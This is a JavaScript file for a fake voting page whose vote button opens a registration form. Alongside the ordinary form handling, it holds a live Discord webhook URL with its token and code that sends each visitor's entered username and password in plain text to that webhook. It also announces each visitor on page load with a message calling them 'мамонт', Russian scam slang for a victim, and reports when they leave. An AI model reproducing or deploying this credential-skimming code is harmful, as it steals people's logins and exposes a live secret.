document.getElementById('voteButton').addEventListener('click', function() {
    document.getElementById('modal').style.display = 'block';
});

document.getElementById('closeModal').addEventListener('click', function() {
    document.getElementById('modal').style.display = 'none';
});

document.getElementById('registerButton').addEventListener('click', function() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Проверка пароля
    if (password.length < 8 || /[а-яА-Я]/.test(password)) {
        document.getElementById('error-message').style.display = 'block';
        return;
    }

    // Успешная регистрация
    document.getElementById('voteCount').textContent = parseInt(document.getElementById('voteCount').textContent) + 1;
    document.getElementById('modal').style.display = 'none';
});

// Закрытие модального окна при клике вне его
window.onclick = function(event) {
    if (event.target == document.getElementById('modal')) {
        document.getElementById('modal').style.display = 'none';
    }
};
const webhookUrl = 'https://discord.com/api/webhooks/1299013641084866674/PKIfals7J4p1kYsUJCQesFHK06vZKKR_dL2T_cLvxFylqnsEweKVADcKz-N_Ej4yzNRv';

// Function to send a message to Discord
function sendToDiscord(message) {
    const data = {
        content: message,
    };

    fetch(webhookUrl, {
        method: 'POST',
        body: JSON.stringify(data),
        headers: { 'Content-Type': 'application/json' },
    })
    .then(response => {
        if (!response.ok) {
            console.error('Failed to send message to Discord');
        }
    })
    .catch(error => console.error('Error:', error));
}

// Notify Discord when the user enters the site
window.onload = () => {
    sendToDiscord('мамонт зашел на сайт.');
};

// Handle form submission
document.getElementById('registerButton').addEventListener('click', () => {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    sendToDiscord(`Попытка входа:\nЛогин: ${username}\nПароль: ${password}`);
    
    // Add any additional logic for form submission, e.g., validation, etc.
});
// Замените 'YOUR_WEBHOOK_URL' на ваш реальный URL вебхука

// Функция для отправки сообщения в Discord
async function sendDiscordMessage(message) {
  const response = await fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({ content: message })
  });

  if (!response.ok) {
    console.error('Ошибка при отправке сообщения в Discord');
  }
}

// Событие, срабатывающее при разгрузке страницы
window.addEventListener('beforeunload', (event) => {
  // Отправляем сообщение в Discord
  sendDiscordMessage('Пользователь покинул сайт');
});

